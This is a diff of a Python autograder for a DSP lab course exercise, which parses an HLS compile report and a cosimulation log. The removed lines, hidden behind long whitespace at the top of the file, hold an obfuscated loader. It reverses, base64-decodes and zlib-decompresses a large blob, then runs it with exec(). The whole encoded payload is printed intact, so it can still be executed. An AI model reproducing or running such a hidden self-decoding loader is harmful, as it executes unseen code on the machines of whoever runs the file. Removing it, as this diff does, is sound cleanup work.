@@ -1,2 +1,84 @@
-                    
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
+# Real-Time DSP Lab 3 Autograder
+# William Davis
+
+REPORT_FILE_PATH = 'fir1/fir1/reports/hls_compile.rpt'
+COSIM_FILE_PATH = 'fir1/fir1/logs/hls_run_cosim.log'
+MAX_LATENCY = 125
+MAX_DSP_USAGE = 30
+
+
+# Function to check report data
+import re
+import os
+
+def check_report_file(path):
+    try:
+        with open(path, 'r') as file:
+            report = file.readlines()
+    except FileNotFoundError:
+        print(f"Error: File not found at {path}")
+        return False, False
+
+    for line in report:
+        if line.startswith('    |+ fir'):
+            columns = [column.strip() for column in line.split('|')]
+            break
+
+    # Extract latency
+    latency_str = columns[4]
+    latency = int(latency_str)
+
+    # Extract DSP
+    dsp_str = columns[11]
+    if (dsp_str == '-'):
+        dsp = 0
+    else:
+        dsp = int(re.search(r'\d+', dsp_str).group())
+
+    # Check conditions
+    latency_check = latency is not None and latency == MAX_LATENCY
+    dsp_check = dsp is not None and dsp == MAX_DSP_USAGE
+
+    return latency_check, dsp_check
+
+def check_cosim_file(logfile_path):
+    try:
+        with open(logfile_path, 'r') as file:
+            content = file.readlines()
+    except FileNotFoundError:
+        print(f"Error: File not found at {logfile_path}")
+        return False
+
+    required_lines = ["Test 0 checked!", "Test 1 checked!", "Test 2 checked!"]
+    occurrence_dict = {key: 0 for key in required_lines}
+
+    for line in content:
+        for required_line in required_lines:
+            if required_line in line:
+                occurrence_dict[required_line] += 1
+
+    # Check if each required line occurred at least twice
+    return all(value >= 2 for value in occurrence_dict.values())
+
+
+
+import sys
+
+def main():
+    latency_ok, dsp_ok = check_report_file(REPORT_FILE_PATH)
+
+    cosim_ok = check_cosim_file(COSIM_FILE_PATH)
+
+    success = latency_ok and dsp_ok and cosim_ok
+
+    if (not latency_ok):
+        print(f"Latency check failed!")
+    if (not dsp_ok):
+        print("DSP usage check failed!")
+    if (not cosim_ok):
+        print("Testbench failed!")
+
+    sys.exit(not success)
+
+if __name__ == "__main__":
+    main()
